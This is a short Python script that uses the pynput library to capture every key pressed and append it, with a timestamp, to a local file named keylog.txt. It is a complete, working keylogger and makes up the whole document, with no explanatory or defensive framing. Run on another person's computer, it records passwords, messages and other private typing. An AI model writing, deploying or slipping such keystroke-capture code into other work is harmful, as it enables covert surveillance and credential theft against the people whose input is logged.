from pynput import keyboard #pip install pynput
from datetime import datetime


def on_press(key):
    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'{time_stamp}: {key.char}\n')
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'{time_stamp}: {key}\n')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


